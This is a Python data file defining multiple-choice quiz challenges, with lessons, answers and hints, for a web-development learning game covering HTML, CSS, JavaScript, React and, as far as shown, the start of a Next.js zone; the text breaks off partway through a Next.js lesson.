"""
zones.py — Web Development zones and challenges for Web Forge.

8 zones, ~45 challenges. All challenges use "type": "quiz" with
multiple-choice options (a/b/c/d) and two hints each.
"""

ZONE_ORDER = [
    "html_fundamentals",
    "css_modern",
    "javascript_core",
    "react_essentials",
    "nextjs",
    "web_performance",
    "web_security",
    "deployment",
]

ZONES = {
    # ── ZONE 1: HTML FUNDAMENTALS ─────────────────────────────────────
    "html_fundamentals": {
        "id": "html_fundamentals",
        "name": "The Markup Layer",
        "subtitle": "Semantic HTML, Forms, Accessibility & Document Structure",
        "color": "cyan",
        "icon": "📄",
        "commands": ["<header>", "<main>", "<form>", "<meta>", "aria-*"],
        "challenges": [
            {
                "id": "html_1",
                "type": "quiz",
                "title": "Semantic Sections",
                "question": (
                    "Which HTML element should you use to wrap the primary content\n"
                    "of a page — the content unique to that page, excluding headers,\n"
                    "footers, and navigation?"
                ),
                "lesson": (
                    "The <main> element represents the dominant content of the <body>.\n\n"
                    "  <main> — primary content, unique to the page\n"
                    "  <header> — introductory content or navigation aids\n"
                    "  <footer> — footer for its nearest sectioning content\n"
                    "  <article> — self-contained composition (blog post, comment)\n"
                    "  <section> — thematic grouping of content\n\n"
                    "There should be only one <main> element per page, and it\n"
                    "should not be nested inside <article>, <aside>, <header>,\n"
                    "<footer>, or <nav>."
                ),
                "options": [
                    "<div id='content'>",
                    "<main>",
                    "<section>",
                    "<article>",
                ],
                "answer": "b",
                "xp": 25,
                "hints": [
                    "It's a semantic element introduced in HTML5 specifically for the page's primary content.",
                    "The element name literally describes what it contains — the main content.",
                ],
            },
            {
                "id": "html_2",
                "type": "quiz",
                "title": "Form Input Types",
                "question": (
                    "You need an input field that shows a native date picker on\n"
                    "mobile and desktop browsers. Which input type achieves this?"
                ),
                "lesson": (
                    "HTML5 introduced several specialized input types:\n\n"
                    "  type='date'     — calendar date picker (YYYY-MM-DD)\n"
                    "  type='time'     — time picker (HH:MM)\n"
                    "  type='email'    — email with built-in validation\n"
                    "  type='number'   — numeric input with spinner\n"
                    "  type='range'    — slider control\n"
                    "  type='color'    — color picker\n"
                    "  type='tel'      — phone number (shows numeric keyboard on mobile)\n\n"
                    "These types provide native UI controls and built-in validation\n"
                    "without JavaScript."
                ),
                "options": [
                    "type='text' with a JavaScript datepicker library",
                    "type='date'",
                    "type='calendar'",
                    "type='datetime'",
                ],
                "answer": "b",
                "xp": 25,
                "hints": [
                    "HTML5 added native input types for common data formats — no JS needed.",
                    "The type name matches exactly what you're picking: a date.",
                ],
            },
            {
                "id": "html_3",
                "type": "quiz",
                "title": "Accessibility Labels",
                "question": (
                    "A screen reader user navigates to a form input but hears\n"
                    "no label. What is the MOST reliable way to associate a\n"
                    "visible label with an input?"
                ),
                "lesson": (
                    "The <label> element creates an explicit association\n"
                    "between text and a form control:\n\n"
                    "  <label for='email'>Email</label>\n"
                    "  <input id='email' type='email'>\n\n"
                    "The 'for' attribute must match the input's 'id'.\n"
                    "This gives screen readers the label text and also makes\n"
                    "the label clickable to focus the input.\n\n"
                    "Alternatives (less preferred):\n"
                    "  - Wrapping: <label>Email <input type='email'></label>\n"
                    "  - aria-label: invisible to sighted users\n"
                    "  - aria-labelledby: references another element's id\n\n"
                    "The explicit <label for> pattern is the gold standard."
                ),
                "options": [
                    "Add a placeholder attribute to the input",
                    "Put the input inside a <div> with a title attribute",
                    "Use <label for='id'> matching the input's id attribute",
                    "Add an aria-hidden='false' attribute",
                ],
                "answer": "c",
                "xp": 25,
                "hints": [
                    "The HTML spec has a dedicated element for labeling form controls.",
                    "<label for='...'> creates an explicit link between label text and the input.",
                ],
            },
            {
                "id": "html_4",
                "type": "quiz",
                "title": "Meta Viewport",
                "question": (
                    "Your page renders tiny on mobile devices — the entire desktop\n"
                    "layout squeezed into a phone screen. Which <meta> tag fixes\n"
                    "this by telling the browser to match the device width?"
                ),
                "lesson": (
                    "The viewport meta tag controls how the page is scaled on mobile:\n\n"
                    "  <meta name='viewport' content='width=device-width, initial-scale=1'>\n\n"
                    "Without it, mobile browsers render the page at a virtual width\n"
                    "(typically 980px) and shrink it to fit the screen.\n\n"
                    "  width=device-width — match the screen's actual width\n"
                    "  initial-scale=1    — no zoom applied on load\n\n"
                    "This tag is essential for responsive design. Every modern\n"
                    "framework includes it by default."
                ),
                "options": [
                    "<meta name='viewport' content='width=device-width, initial-scale=1'>",
                    "<meta name='mobile' content='responsive=true'>",
                    "<meta http-equiv='X-UA-Compatible' content='width=auto'>",
                    "<meta name='screen' content='fit=device'>",
                ],
                "answer": "a",
                "xp": 30,
                "hints": [
                    "The meta tag uses name='viewport' and the content sets the width.",
                    "width=device-width tells the browser to use the actual device screen width.",
                ],
            },
            {
                "id": "html_5",
                "type": "quiz",
                "title": "Semantic Navigation",
                "question": (
                    "You're building a site header with a logo and navigation links.\n"
                    "Which combination of semantic elements is the most correct?"
                ),
                "lesson": (
                    "Semantic HTML communicates structure to browsers and assistive tech:\n\n"
                    "  <header> — introductory content, often contains navigation\n"
                    "  <nav>    — section with navigation links\n\n"
                    "  <header>\n"
                    "    <a href='/'><img src='logo.svg' alt='Site Name'></a>\n"
                    "    <nav>\n"
                    "      <a href='/about'>About</a>\n"
                    "      <a href='/blog'>Blog</a>\n"
                    "    </nav>\n"
                    "  </header>\n\n"
                    "Screen readers use <nav> to let users jump directly to navigation.\n"
                    "Multiple <nav> elements are valid — use aria-label to distinguish them."
                ),
                "options": [
                    "<div class='header'> with <div class='nav'>",
                    "<header> with <nav> inside it",
                    "<head> with <navigation> inside it",
                    "<section role='banner'> with <menu> inside it",
                ],
                "answer": "b",
                "xp": 25,
                "hints": [
                    "HTML5 has dedicated elements for page headers and navigation sections.",
                    "<header> wraps introductory content; <nav> wraps navigation links.",
                ],
            },
            {
                "id": "html_6",
                "type": "quiz",
                "title": "The Open Graph Protocol",
                "question": (
                    "When you share a link on social media, a rich preview appears\n"
                    "with a title, description, and image. Which meta tag protocol\n"
                    "controls this preview?"
                ),
                "lesson": (
                    "Open Graph (OG) meta tags control link previews on social platforms:\n\n"
                    "  <meta property='og:title' content='Page Title'>\n"
                    "  <meta property='og:description' content='Page summary'>\n"
                    "  <meta property='og:image' content='https://example.com/img.jpg'>\n"
                    "  <meta property='og:url' content='https://example.com/page'>\n\n"
                    "Originally created by Facebook, OG is now used by Twitter/X,\n"
                    "LinkedIn, Discord, Slack, and most platforms that render link previews.\n\n"
                    "Twitter also supports twitter:card meta tags for additional control."
                ),
                "options": [
                    "Schema.org JSON-LD",
                    "Open Graph (og:) meta tags",
                    "Dublin Core meta tags",
                    "rel='preview' link tags",
                ],
                "answer": "b",
                "xp": 25,
                "hints": [
                    "The protocol uses property='og:...' attributes on <meta> tags.",
                    "It was created by Facebook and named after the social graph concept.",
                ],
            },
        ],
    },

    # ── ZONE 2: MODERN CSS ────────────────────────────────────────────
    "css_modern": {
        "id": "css_modern",
        "name": "The Style Matrix",
        "subtitle": "Flexbox, Grid, Custom Properties, Animations & Responsive Design",
        "color": "magenta",
        "icon": "🎨",
        "commands": ["display: flex", "display: grid", "var()", "@media", "@container"],
        "challenges": [
            {
                "id": "css_1",
                "type": "quiz",
                "title": "Flexbox Centering",
                "question": (
                    "You need to center a child element both horizontally and vertically\n"
                    "inside its parent. Using Flexbox, which combination of properties\n"
                    "on the parent achieves this?"
                ),
                "lesson": (
                    "Flexbox centering — the most common CSS pattern:\n\n"
                    "  .parent {\n"
                    "    display: flex;\n"
                    "    justify-content: center;  /* horizontal (main axis) */\n"
                    "    align-items: center;       /* vertical (cross axis) */\n"
                    "  }\n\n"
                    "justify-content controls the main axis (horizontal by default).\n"
                    "align-items controls the cross axis (vertical by default).\n\n"
                    "Shorthand: place-items: center; (works with grid too)"
                ),
                "options": [
                    "display: flex; text-align: center; vertical-align: middle;",
                    "display: flex; justify-content: center; align-items: center;",
                    "display: flex; align-content: center; justify-items: center;",
                    "display: flex; margin: auto; padding: auto;",
                ],
                "answer": "b",
                "xp": 25,
                "hints": [
                    "justify-content handles the main axis; align-items handles the cross axis.",
                    "Both need the value 'center' to center in both directions.",
                ],
            },
            {
                "id": "css_2",
                "type": "quiz",
                "title": "CSS Grid Template",
                "question": (
                    "You want a 3-column layout where the first column is 200px,\n"
                    "the middle takes all remaining space, and the third is 100px.\n"
                    "Which grid-template-columns value achieves this?"
                ),
                "lesson": (
                    "grid-template-columns defines column sizes in CSS Grid:\n\n"
                    "  .grid {\n"
                    "    display: grid;\n"
                    "    grid-template-columns: 200px 1fr 100px;\n"
                    "  }\n\n"
                    "The fr unit represents a fraction of the remaining space.\n"
                    "  1fr         — takes all remaining space\n"
                    "  1fr 2fr     — second column gets twice the space of the first\n"
                    "  repeat(3, 1fr) — three equal columns\n\n"
                    "Fixed units (px, rem) and fr units can be freely mixed."
                ),
                "options": [
                    "200px auto 100px",
                    "200px 1fr 100px",
                    "200px flex-grow 100px",
                    "200px fill 100px",
                ],
                "answer": "b",
                "xp": 25,
                "hints": [
                    "CSS Grid has a special unit for 'take remaining space.'",
                    "The unit is 'fr' — short for fraction. 1fr means one fraction of leftover space.",
                ],
            },
            {
                "id": "css_3",
                "type": "quiz",
                "title": "Custom Properties (CSS Variables)",
                "question": (
                    "You want to define a reusable color value in CSS that can be\n"
                    "changed at runtime with JavaScript. Which syntax declares and\n"
                    "uses a CSS custom property?"
                ),
                "lesson": (
                    "CSS custom properties (variables) use the -- prefix:\n\n"
                    "  :root {\n"
                    "    --primary: #0066ff;\n"
                    "    --spacing: 1rem;\n"
                    "  }\n\n"
                    "  .button {\n"
                    "    background: var(--primary);\n"
                    "    padding: var(--spacing);\n"
                    "  }\n\n"
                    "Unlike preprocessor variables (Sass $var), custom properties:\n"
                    "  - Exist at runtime in the browser\n"
                    "  - Can be changed with JavaScript: el.style.setProperty('--primary', '#red')\n"
                    "  - Cascade and inherit like normal CSS properties\n"
                    "  - Support fallbacks: var(--primary, blue)"
                ),
                "options": [
                    "$primary: #0066ff; then background: $primary;",
                    "@define primary #0066ff; then background: primary;",
                    "--primary: #0066ff; then background: var(--primary);",
                    "const(primary, #0066ff); then background: use(primary);",
                ],
                "answer": "c",
                "xp": 25,
                "hints": [
                    "CSS custom properties use a double-dash prefix to declare.",
                    "The var() function retrieves the value: var(--property-name).",
                ],
            },
            {
                "id": "css_4",
                "type": "quiz",
                "title": "CSS Animations",
                "question": (
                    "You want an element to fade in over 0.5 seconds when it appears.\n"
                    "Which approach uses CSS @keyframes correctly?"
                ),
                "lesson": (
                    "CSS @keyframes define animation sequences:\n\n"
                    "  @keyframes fadeIn {\n"
                    "    from { opacity: 0; }\n"
                    "    to   { opacity: 1; }\n"
                    "  }\n\n"
                    "  .element {\n"
                    "    animation: fadeIn 0.5s ease-in;\n"
                    "  }\n\n"
                    "The animation shorthand:\n"
                    "  animation: name duration timing-function delay iteration-count direction;\n\n"
                    "For simple state transitions, CSS transitions are often simpler:\n"
                    "  transition: opacity 0.5s ease-in;"
                ),
                "options": [
                    "@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } } with animation: fadeIn 0.5s;",
                    "@animate fadeIn { start { opacity: 0; } end { opacity: 1; } }",
                    "transition: fade 0.5s; with @transition fade { opacity: 0 to 1; }",
                    "@keyframes fadeIn { 0% { visible: false; } 100% { visible: true; } }",
                ],
                "answer": "a",
                "xp": 30,
                "hints": [
                    "@keyframes defines the animation; the animation property applies it.",
                    "from/to (or 0%/100%) define the start and end states.",
                ],
            },
            {
                "id": "css_5",
                "type": "quiz",
                "title": "Responsive Breakpoints",
                "question": (
                    "You want a layout that switches from a single column on phones\n"
                    "to two columns on tablets and wider. What is the correct\n"
                    "@media query approach for mobile-first design?"
                ),
                "lesson": (
                    "Mobile-first means starting with the smallest screen and\n"
                    "adding complexity for larger screens with min-width:\n\n"
                    "  /* Mobile default: single column */\n"
                    "  .grid { display: grid; grid-template-columns: 1fr; }\n\n"
                    "  /* Tablet and up: two columns */\n"
                    "  @media (min-width: 768px) {\n"
                    "    .grid { grid-template-columns: 1fr 1fr; }\n"
                    "  }\n\n"
                    "min-width = 'at this size and above' (mobile-first, preferred)\n"
                    "max-width = 'at this size and below' (desktop-first)\n\n"
                    "Common breakpoints: 640px (sm), 768px (md), 1024px (lg), 1280px (xl)"
                ),
                "options": [
                    "@media (max-width: 768px) { /* phone styles */ }",
                    "@media (min-width: 768px) { /* tablet-and-up styles */ }",
                    "@media (device-type: tablet) { /* tablet styles */ }",
                    "@media (screen-size: medium) { /* medium styles */ }",
                ],
                "answer": "b",
                "xp": 30,
                "hints": [
                    "Mobile-first means base styles are for phones; media queries add complexity upward.",
                    "min-width means 'apply these styles at this width and above.'",
                ],
            },
            {
                "id": "css_6",
                "type": "quiz",
                "title": "Container Queries",
                "question": (
                    "Container queries let a component respond to its PARENT's size\n"
                    "instead of the viewport. What CSS property must you set on the\n"
                    "parent to enable container queries on it?"
                ),
                "lesson": (
                    "Container queries — component-level responsive design:\n\n"
                    "  .card-wrapper {\n"
                    "    container-type: inline-size;\n"
                    "    container-name: card;\n"
                    "  }\n\n"
                    "  @container card (min-width: 400px) {\n"
                    "    .card { flex-direction: row; }\n"
                    "  }\n\n"
                    "container-type values:\n"
                    "  inline-size — query the inline (width) dimension\n"
                    "  size        — query both dimensions\n"
                    "  normal      — no containment (default)\n\n"
                    "Unlike @media which queries the viewport, @container queries\n"
                    "the nearest ancestor with container-type set."
                ),
                "options": [
                    "display: container;",
                    "container-type: inline-size;",
                    "contain: layout;",
                    "position: container;",
                ],
                "answer": "b",
                "xp": 35,
                "hints": [
                    "You need to explicitly opt a parent element into being a containment context.",
                    "The property is container-type and the most common value is inline-size.",
                ],
            },
        ],
    },

    # ── ZONE 3: JAVASCRIPT CORE ──────────────────────────────────────
    "javascript_core": {
        "id": "javascript_core",
        "name": "The Script Engine",
        "subtitle": "Closures, Promises, Async/Await, Event Loop & Modules",
        "color": "yellow",
        "icon": "⚡",
        "commands": ["async/await", "Promise", "import/export", "() => {}", "...spread"],
        "challenges": [
            {
                "id": "js_1",
                "type": "quiz",
                "title": "Closure Fundamentals",
                "question": (
                    "function makeCounter() {\n"
                    "  let count = 0;\n"
                    "  return () => ++count;\n"
                    "}\n"
                    "const counter = makeCounter();\n"
                    "counter(); counter(); counter();\n\n"
                    "What does the third call to counter() return?"
                ),
                "lesson": (
                    "A closure is a function that remembers its outer scope\n"
                    "even after the outer function has returned:\n\n"
                    "  function makeCounter() {\n"
                    "    let count = 0;        // lives in the closure\n"
                    "    return () => ++count;  // has access to count forever\n"
                    "  }\n\n"
                    "Each call to makeCounter() creates a new, independent closure.\n"
                    "The inner function 'closes over' the count variable.\n\n"
                    "Closures are the foundation of:\n"
                    "  - Data privacy (module pattern)\n"
                    "  - React hooks (useState stores state in closures)\n"
                    "  - Event handlers that remember context"
                ),
                "options": [
                    "0",
                    "1",
                    "3",
                    "undefined",
                ],
                "answer": "c",
                "xp": 30,
                "hints": [
                    "The inner function increments count each time it's called, and count persists.",
                    "++count is pre-increment: increment first, then return. Three calls = 1, 2, 3.",
                ],
            },
            {
                "id": "js_2",
                "type": "quiz",
                "title": "Promise Basics",
                "question": (
                    "Which method do you chain onto a Promise to handle a\n"
                    "successful result?"
                ),
                "lesson": (
                    "Promises represent an asynchronous operation's eventual result:\n\n"
                    "  fetch('/api/data')\n"
                    "    .then(response => response.json())  // success\n"
                    "    .catch(error => console.error(error))  // failure\n"
                    "    .finally(() => setLoading(false));     // always runs\n\n"
                    "Promise states:\n"
                    "  pending   — initial state, not yet settled\n"
                    "  fulfilled — operation completed successfully (.then)\n"
                    "  rejected  — operation failed (.catch)\n\n"
                    "Promises are the building block for async/await."
                ),
                "options": [
                    ".resolve()",
                    ".then()",
                    ".success()",
                    ".await()",
                ],
                "answer": "b",
                "xp": 25,
                "hints": [
                    "It's the method that receives the resolved value as its callback argument.",
                    "The method name is four letters: .then()",
                ],
            },
            {
                "id": "js_3",
                "type": "quiz",
                "title": "Async/Await",
                "question": (
                    "What does the 'async' keyword before a function declaration do?"
                ),
                "lesson": (
                    "async/await is syntactic sugar over Promises:\n\n"
                    "  async function getData() {\n"
                    "    const res = await fetch('/api/data');\n"
                    "    const json = await res.json();\n"
                    "    return json;\n"
                    "  }\n\n"
                    "The async keyword:\n"
                    "  - Makes the function always return a Promise\n"
                    "  - Enables the use of 'await' inside the function body\n\n"
                    "await pauses execution until the Promise settles.\n"
                    "Error handling: use try/catch instead of .catch()."
                ),
                "options": [
                    "Makes the function run in a separate thread",
                    "Makes the function always return a Promise and enables await inside it",
                    "Makes all operations inside the function non-blocking by default",
                    "Defers execution until the call stack is empty",
                ],
                "answer": "b",
                "xp": 25,
                "hints": [
                    "async transforms the function's return value — it always wraps it in a Promise.",
                    "The key pairing is: async on the function, await on the Promises inside it.",
                ],
            },
            {
                "id": "js_4",
                "type": "quiz",
                "title": "The Event Loop",
                "question": (
                    "console.log('A');\n"
                    "setTimeout(() => console.log('B'), 0);\n"
                    "Promise.resolve().then(() => console.log('C'));\n"
                    "console.log('D');\n\n"
                    "What is the output order?"
                ),
                "lesson": (
                    "The JavaScript event loop processes tasks in this order:\n\n"
                    "  1. Call stack (synchronous code runs first)\n"
                    "  2. Microtask queue (Promises, queueMicrotask)\n"
                    "  3. Macrotask queue (setTimeout, setInterval, I/O)\n\n"
                    "So: synchronous A and D run first. Then the microtask\n"
                    "(Promise.then → C). Then the macrotask (setTimeout → B).\n\n"
                    "This is why setTimeout(..., 0) doesn't run 'immediately' —\n"
                    "it just schedules a macrotask that runs after all synchronous\n"
                    "code and microtasks complete."
                ),
                "options": [
                    "A, B, C, D",
                    "A, D, B, C",
                    "A, D, C, B",
                    "A, C, D, B",
                ],
                "answer": "c",
                "xp": 35,
                "hints": [
                    "Synchronous code runs first (A, D), then microtasks, then macrotasks.",
                    "Promise.then is a microtask (higher priority). setTimeout is a macrotask (lower priority).",
                ],
            },
            {
                "id": "js_5",
                "type": "quiz",
                "title": "ES Modules",
                "question": (
                    "In modern JavaScript (ES modules), what is the correct way\n"
                    "to export a function as the default export and import it\n"
                    "in another file?"
                ),
                "lesson": (
                    "ES Modules use import/export syntax:\n\n"
                    "  // math.js\n"
                    "  export default function add(a, b) { return a + b; }\n"
                    "  export const PI = 3.14159;\n\n"
                    "  // app.js\n"
                    "  import add from './math.js';        // default import\n"
                    "  import { PI } from './math.js';     // named import\n"
                    "  import add, { PI } from './math.js'; // both\n\n"
                    "Default exports: one per module, imported without braces.\n"
                    "Named exports: unlimited per module, imported with braces.\n\n"
                    "CommonJS (require/module.exports) is the older Node.js system."
                ),
                "options": [
                    "module.exports = fn; then const fn = require('./file');",
                    "export default fn; then import fn from './file';",
                    "export fn; then import { fn } from './file';",
                    "exports.default = fn; then import fn from './file';",
                ],
                "answer": "b",
                "xp": 25,
                "hints": [
                    "ES modules use the 'export default' and 'import' keywords.",
                    "Default exports are imported without curly braces.",
                ],
            },
            {
                "id": "js_6",
                "type": "quiz",
                "title": "Destructuring Assignment",
                "question": (
                    "const user = { name: 'Ghost', level: 30, role: 'admin' };\n\n"
                    "Which syntax extracts 'name' and 'role' into separate\n"
                    "variables in a single line?"
                ),
                "lesson": (
                    "Destructuring extracts values from objects and arrays:\n\n"
                    "  // Object destructuring\n"
                    "  const { name, role } = user;\n\n"
                    "  // With renaming\n"
                    "  const { name: userName } = user;\n\n"
                    "  // With defaults\n"
                    "  const { name, team = 'unassigned' } = user;\n\n"
                    "  // Array destructuring\n"
                    "  const [first, second] = [10, 20];\n\n"
                    "  // Function parameters\n"
                    "  function greet({ name, role }) { ... }\n\n"
                    "Destructuring is used everywhere in modern JS and React\n"
                    "(props, useState, API responses)."
                ),
                "options": [
                    "const name = user.name; const role = user.role;",
                    "const [name, role] = user;",
                    "const { name, role } = user;",
                    "const (name, role) = user;",
                ],
                "answer": "c",
                "xp": 25,
                "hints": [
                    "Object destructuring uses curly braces that mirror the object's shape.",
                    "The variable names must match the property names (unless you rename with :).",
                ],
            },
        ],
    },

    # ── ZONE 4: REACT ESSENTIALS ──────────────────────────────────────
    "react_essentials": {
        "id": "react_essentials",
        "name": "The Component Forge",
        "subtitle": "Components, Hooks, Props & State Management",
        "color": "blue",
        "icon": "⚛",
        "commands": ["useState", "useEffect", "useRef", "props", "JSX"],
        "challenges": [
            {
                "id": "react_1",
                "type": "quiz",
                "title": "Component Anatomy",
                "question": (
                    "In modern React, what is the recommended way to define\n"
                    "a component?"
                ),
                "lesson": (
                    "Modern React uses function components:\n\n"
                    "  function Greeting({ name }) {\n"
                    "    return <h1>Hello, {name}</h1>;\n"
                    "  }\n\n"
                    "  // Or as an arrow function:\n"
                    "  const Greeting = ({ name }) => <h1>Hello, {name}</h1>;\n\n"
                    "Function components:\n"
                    "  - Are simpler than class components\n"
                    "  - Use hooks for state and lifecycle\n"
                    "  - Can use all React features since hooks were introduced (v16.8)\n\n"
                    "Class components still work but are no longer recommended\n"
                    "for new code."
                ),
                "options": [
                    "class Greeting extends React.Component { render() { ... } }",
                    "function Greeting(props) { return <h1>Hello</h1>; }",
                    "React.createComponent('Greeting', { ... })",
                    "const Greeting = React.memo({ render: () => <h1>Hello</h1> })",
                ],
                "answer": "b",
                "xp": 25,
                "hints": [
                    "Modern React moved away from classes toward a simpler pattern.",
                    "A function that accepts props and returns JSX is a function component.",
                ],
            },
            {
                "id": "react_2",
                "type": "quiz",
                "title": "useState Hook",
                "question": (
                    "const [count, setCount] = useState(0);\n\n"
                    "What does calling setCount(count + 1) do?"
                ),
                "lesson": (
                    "useState returns a state variable and a setter function:\n\n"
                    "  const [count, setCount] = useState(0);\n"
                    "  //      ^         ^               ^\n"
                    "  //   current   updater      initial value\n\n"
                    "Calling the setter:\n"
                    "  setCount(5)           — sets count to 5\n"
                    "  setCount(c => c + 1)  — updater function (preferred for dependent updates)\n\n"
                    "Important:\n"
                    "  - State updates are asynchronous (batched)\n"
                    "  - State updates trigger a re-render\n"
                    "  - Never mutate state directly: count++ won't work"
                ),
                "options": [
                    "Directly mutates the count variable and updates the DOM",
                    "Schedules a re-render with the new count value",
                    "Returns the new count value synchronously",
                    "Emits a 'statechange' event on the component",
                ],
                "answer": "b",
                "xp": 25,
                "hints": [
                    "React state updates don't happen immediately — they schedule work.",
                    "The setter tells React: 're-render this component with this new state value.'",
                ],
            },
            {
                "id": "react_3",
                "type": "quiz",
                "title": "useEffect Dependencies",
                "question": (
                    "useEffect(() => {\n"
                    "  fetchUser(userId);\n"
                    "}, [userId]);\n\n"
                    "When does this effect run?"
                ),
                "lesson": (
                    "useEffect runs side effects after render:\n\n"
                    "  useEffect(fn)           — runs after every render\n"
                    "  useEffect(fn, [])       — runs once (on mount)\n"
                    "  useEffect(fn, [a, b])   — runs when a or b changes\n\n"
                    "The dependency array tells React when to re-run the effect.\n"
                    "React compares each dependency with its previous value.\n"
                    "If any dependency changed, the effect runs again.\n\n"
                    "Cleanup function (for subscriptions, timers):\n"
                    "  useEffect(() => {\n"
                    "    const sub = subscribe(id);\n"
                    "    return () => sub.unsubscribe(); // cleanup\n"
                    "  }, [id]);"
                ),
                "options": [
                    "Only once when the component mounts",
                    "After every render, regardless of state changes",
                    "On mount and whenever userId changes",
                    "Only when the component unmounts",
                ],
                "answer": "c",
                "xp": 30,
                "hints": [
                    "The dependency array [userId] controls when the effect re-runs.",
                    "It runs on mount (always) and then again whenever userId changes to a new value.",
                ],
            },
            {
                "id": "react_4",
                "type": "quiz",
                "title": "useRef for DOM Access",
                "question": (
                    "You need to programmatically focus an input element when\n"
                    "a button is clicked. Which hook gives you a reference to\n"
                    "the actual DOM node?"
                ),
                "lesson": (
                    "useRef creates a mutable reference that persists across renders:\n\n"
                    "  function SearchBox() {\n"
                    "    const inputRef = useRef(null);\n\n"
                    "    return (\n"
                    "      <>\n"
                    "        <input ref={inputRef} />\n"
                    "        <button onClick={() => inputRef.current.focus()}>\n"
                    "          Focus\n"
                    "        </button>\n"
                    "      </>\n"
                    "    );\n"
                    "  }\n\n"
                    "useRef is also used for:\n"
                    "  - Storing previous values without triggering re-renders\n"
                    "  - Holding timers, intervals, or subscription references\n"
                    "  - Any mutable value that shouldn't cause re-renders when changed"
                ),
                "options": [
                    "useState to store the DOM element",
                    "useEffect with document.querySelector",
                    "useRef with a ref attribute on the element",
                    "useMemo to cache the DOM node",
                ],
                "answer": "c",
                "xp": 30,
                "hints": [
                    "React has a dedicated hook for holding references to DOM elements.",
                    "useRef returns an object with a .current property that points to the DOM node.",
                ],
            },
            {
                "id": "react_5",
                "type": "quiz",
                "title": "Props vs State",
                "question": (
                    "What is the fundamental difference between props and state\n"
                    "in a React component?"
                ),
                "lesson": (
                    "Props and state are both data that influence render output,\n"
                    "but they serve different roles:\n\n"
                    "  Props:\n"
                    "  - Passed from parent to child (like function arguments)\n"
                    "  - Read-only inside the receiving component\n"
                    "  - Changes in parent trigger re-render in child\n\n"
                    "  State:\n"
                    "  - Owned and managed by the component itself\n"
                    "  - Mutable via setter function (setState, useState setter)\n"
                    "  - Changes trigger re-render of the owning component\n\n"
                    "Analogy: props are arguments to a function;\n"
                    "state is local variables inside the function."
                ),
                "options": [
                    "Props are faster; state is slower",
                    "Props are passed from parent and read-only; state is owned by the component and mutable",
                    "Props are for strings; state is for objects",
                    "Props persist across renders; state resets on every render",
                ],
                "answer": "b",
                "xp": 25,
                "hints": [
                    "Think about ownership: who controls the data and who can change it.",
                    "Props flow down from parent. State lives inside the component that declares it.",
                ],
            },
            {
                "id": "react_6",
                "type": "quiz",
                "title": "Lifting State Up",
                "question": (
                    "Two sibling components both need access to the same piece\n"
                    "of state. Where should that state live?"
                ),
                "lesson": (
                    "Lifting state up — the fundamental React data flow pattern:\n\n"
                    "When two components need shared state, move the state to\n"
                    "their closest common ancestor:\n\n"
                    "  function Parent() {\n"
                    "    const [value, setValue] = useState('');\n"
                    "    return (\n"
                    "      <>\n"
                    "        <Input value={value} onChange={setValue} />\n"
                    "        <Display value={value} />\n"
                    "      </>\n"
                    "    );\n"
                    "  }\n\n"
                    "The parent owns the state and passes it down as props.\n"
                    "For deeply nested state, consider Context or state libraries\n"
                    "(Zustand, Jotai, Redux)."
                ),
                "options": [
                    "In a global variable outside the component tree",
                    "In the first sibling, passed to the second via DOM events",
                    "In their closest common parent component",
                    "In a useEffect inside each sibling independently",
                ],
                "answer": "c",
                "xp": 30,
                "hints": [
                    "React data flows downward through props. Shared state needs a common source.",
                    "Move the state up to the nearest parent that contains both siblings.",
                ],
            },
        ],
    },

    # ── ZONE 5: NEXT.JS ──────────────────────────────────────────────
    "nextjs": {
        "id": "nextjs",
        "name": "The Next Dimension",
        "subtitle": "App Router, Server Components, SSR, SSG & API Routes",
        "color": "white",
        "icon": "▲",
        "commands": ["app/", "page.tsx", "layout.tsx", "route.ts", "next/image"],
        "challenges": [
            {
                "id": "next_1",
                "type": "quiz",
                "title": "App Router File Conventions",
                "question": (
                    "In Next.js App Router, which file inside a route folder\n"
                    "defines the UI that is rendered for that route?"
                ),
                "lesson": (
                    "Next.js App Router uses file-based routing with conventions:\n\n"
                    "  app/\n"
                    "    page.tsx      — the route's UI (/)\n"
                    "    layout.tsx    — shared layout wrapping child routes\n"
                    "    loading.tsx   — loading UI (React Suspense boundary)\n"
                    "    error.tsx     — error boundary\n"
                    "    not-found.tsx — 404 page\n"
                    "    route.ts      — API endpoint (no UI)\n\n"
                    "  app/blog/\n"
                    "    page.tsx      — renders at /blog\n"
                    "  app/blog/[slug]/\n"
                    "    page.tsx      — renders at /blog/:slug\n\n"
                    "page.tsx is the required file — without it, the folder\n"
                    "is not a routable segment."
                ),
                "options": [
                    "index.tsx",
                    "page.tsx",
                    "route.tsx",
                    "view.tsx",
                ],
                "answer": "b",
                "xp": 25,
                "hints": [
                    "App Router introduced new file naming conventions different from Pages Router.",
                    "The file is named after what it represents — a page.",
                ],
            },
            {
                "id": "next_2",
                "type": "quiz",
                "title": "Server Components",
                "question": (
                    "In the Next.js App Router, components are Server Components\n"
                    "by default. What directive do you add at the top of a file\n"
                    "to make it a Client Component?"
                ),
                "lesson": (
                    "React Server Components (RSC) in Next.js:\n\n"
                    "  Server Components (default):\n"
                    "  - Render on the server only\n"
                    "  - Can use async/await directly\n"
                    "  - Can access databases, file systems, env vars\n"
                    "  - Zero client-side JavaScript bundle for the component\n"
                    "  - Cannot use hooks or browser APIs\n\n"
                    "  Client Components:\n"
                    "  - Add 'use client' at the top of the file\n"
                    "  - Can use hooks (useState, useEffect, etc.)\n"
                    "  - Can use browser APIs (window, document)\n"
                    "  - Ship JavaScript to the client\n\n"
                    "Guideline: keep components on the server by default;\n"
                    "add 'use client' only when you need interactivity."
                ),
                "options": [
                    "'use browser'",
                    "'use client'",
                    "'use interactive'",
                    "'use frontend'",
                ],
                "answer": "b",
                "xp": 25,
                "hints": [
                    "The directive is a string literal at the very top of the file.",
                    "The directive names the environment where the component runs — the client.",
                ],
            },
            {
                "id": "next_3",
                "type": "quiz",
                "title": "SSR vs SSG",
                "question": (
                    "What is the key difference between Static Site Generation (SSG)\n"
                    "and Server-Side Rendering (SSR) in Next.js?"
                ),
                "lesson": (
                    "Rendering strategies in Next.js:\n\n"
                    "  SSG (Static Site Generation):\n"
                    "  - HTML generated at BUILD time\n"
                    "  - Cached and served from CDN\n"
                    "  - Fastest possible response time\n"
                    "  - Use for: blog posts, docs, marketing pages\n\n"
                    "  SSR (Server-Side Rendering):\n"
                    "  - HTML generated on EACH request\n"
                    "  - Always up-to-date data\n"
                    "  - Slower than static (server must render)\n"
                    "  - Use for: dashboards, user-specific pages\n\n"
                    "  ISR (Incremental Static Regeneration):\n"
                    "  - Static at first, then re-generated in the background\n"
                    "  - Best of both: fast + fresh data\n\n"
